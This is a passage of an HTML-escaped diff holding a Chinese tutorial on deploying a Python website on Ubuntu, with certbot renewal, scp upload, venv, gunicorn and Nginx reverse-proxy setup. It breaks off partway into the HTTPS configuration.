+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo certbot renew --dry-run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果安装方式没有配置自动续期任务，也可以手动添加 cron：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo crontab -e&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;添加：&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0 2 * * * certbot renew --quiet&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;每天凌晨 2 点检查是否需要续期。&lt;/p&gt;
+&lt;p&gt;注意： &lt;code&gt;certbot renew&lt;/code&gt;  只会在证书接近到期时执行实际续期，并不是每天都重新签发证书。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;网站部署&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站部署&#34;&gt;#&lt;/a&gt; 网站部署&lt;/h2&gt;
+&lt;p&gt;前面已经准备好了服务器环境、域名和 HTTPS 证书，接下来正式部署网站。&lt;/p&gt;
+&lt;h3 id=&#34;上传网站文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上传网站文件&#34;&gt;#&lt;/a&gt; 上传网站文件&lt;/h3&gt;
+&lt;p&gt;在本地电脑上，通过 SCP 将网站文件上传到服务器。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;scp -r ./mywebsite root@服务器公网IP:/var/www/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果使用 SSH 私钥：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;scp -i ~/.ssh/id_rsa -r \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ./mywebsite \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    root@服务器公网IP:/var/www/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;上传完成后，登录服务器：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh root@服务器公网IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;检查网站文件：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ls -lah /var/www/mywebsite/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;安装-python-项目依赖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装-python-项目依赖&#34;&gt;#&lt;/a&gt; 安装 Python 项目依赖&lt;/h3&gt;
+&lt;p&gt;进入网站目录：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; /var/www/mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;创建 Python 虚拟环境：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3.11 -m venv venv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;激活虚拟环境：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt; venv/bin/activate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;安装依赖：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pip install -r requirements.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果项目没有  &lt;code&gt;requirements.txt&lt;/code&gt; ，可以根据实际依赖安装对应的 Python 包。&lt;/p&gt;
+&lt;h3 id=&#34;测试启动网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#测试启动网站&#34;&gt;#&lt;/a&gt; 测试启动网站&lt;/h3&gt;
+&lt;p&gt;先手动启动网站：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3.11 server.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;假设网站监听本机的 8000 端口：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1:8000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;可以通过以下命令检查端口：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ss -lntp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;也可以在服务器内部执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl http://127.0.0.1:8000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;确认网站能够正常访问后，再进行 Nginx 配置。&lt;/p&gt;
+&lt;p&gt;注意：正式部署时，建议使用 Gunicorn 等生产级 WSGI/ASGI 服务运行应用。&lt;/p&gt;
+&lt;p&gt;例如 Flask 项目可以使用：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./venv/bin/gunicorn \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --workers 2 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --&lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt; 127.0.0.1:8000 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server:app&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里假设  &lt;code&gt;server.py&lt;/code&gt;  中的 Flask 应用对象名为  &lt;code&gt;app&lt;/code&gt; 。&lt;/p&gt;
+&lt;h3 id=&#34;配置-nginx-反向代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置-nginx-反向代理&#34;&gt;#&lt;/a&gt; 配置 Nginx 反向代理&lt;/h3&gt;
+&lt;p&gt;Nginx 是一个高性能 Web 服务器，也可以作为反向代理服务器使用。&lt;/p&gt;
+&lt;p&gt;它在本次部署中的主要作用是：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;接收用户发起的 HTTP/HTTPS 请求。&lt;/li&gt;
+&lt;li&gt;根据域名匹配对应的网站配置。&lt;/li&gt;
+&lt;li&gt;将请求转发到本机运行的 Python 服务。&lt;/li&gt;
+&lt;li&gt;将 Python 服务返回的内容转发给用户。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;用户浏览器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    | HTTPS :443&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Nginx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    | HTTP :8000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Python 网站服务&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这样，Python 服务只需要监听本机的 8000 端口，无需直接暴露给公网。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nginx 配置文件位置&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Ubuntu 中常见的 Nginx 配置目录：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/etc/nginx/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── nginx.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── conf.d/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── sites-available/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└── sites-enabled/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;其中：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nginx.conf&lt;/code&gt; ：Nginx 主配置文件。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;conf.d/&lt;/code&gt; ：可以存放额外的网站配置文件。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sites-available/&lt;/code&gt; ：存放可用的网站配置。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sites-enabled/&lt;/code&gt; ：存放已经启用的网站配置，通常通过符号链接关联  &lt;code&gt;sites-available&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;建议使用  &lt;code&gt;sites-available&lt;/code&gt;  和  &lt;code&gt;sites-enabled&lt;/code&gt;  管理 Ubuntu 上的网站配置。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;创建网站配置文件&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;创建：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/nginx/sites-available/mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;写入以下内容：&lt;/p&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;server&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;listen&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;server_name&lt;/span&gt; example.com www.example.com;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;location&lt;/span&gt; / &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_pass&lt;/span&gt; http://127.0.0.1:8000;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; Host $host;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; X-Real-IP $remote_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-For $proxy_add_x_forwarded_for;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-Proto $scheme;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这段配置表示：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;监听服务器的 80 端口。&lt;/li&gt;
+&lt;li&gt;接收 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29t&#34;&gt;example.com&lt;/span&gt; 和 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==&#34;&gt;www.example.com&lt;/span&gt; 的请求。&lt;/li&gt;
+&lt;li&gt;将请求转发到本机的 8000 端口。&lt;/li&gt;
+&lt;li&gt;将用户的真实 IP 和原始请求协议传递给后端服务。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;启用网站配置&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;创建符号链接：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ln -s \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /etc/nginx/sites-available/mywebsite \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /etc/nginx/sites-enabled/mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果使用默认站点配置，并且不再需要它，可以移除默认站点的启用链接：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo rm /etc/nginx/sites-enabled/default&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意：只在确认不再需要默认站点时执行。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;检查并重载 Nginx&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;检查配置是否正确：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo nginx -t&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果输出：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;syntax is ok&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;test is successful&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;说明配置没有语法错误。&lt;/p&gt;
+&lt;p&gt;重载 Nginx：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl reload nginx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看运行状态：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl status nginx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;配置-https&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置-https&#34;&gt;#&lt;/a&gt; 配置 HTTPS&lt;/h3&gt;
+&lt;p&gt;如果前面已经执行过：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo certbot --nginx -d example.com -d www.example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Certbot 通常已经自动添加了 HTTPS 配置。&lt;/p&gt;
+&lt;p&gt;如果需要手动配置，可以在 Nginx 的 HTTPS server 块中添加：&lt;/p&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;server&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;listen&lt;/span&gt; &lt;span 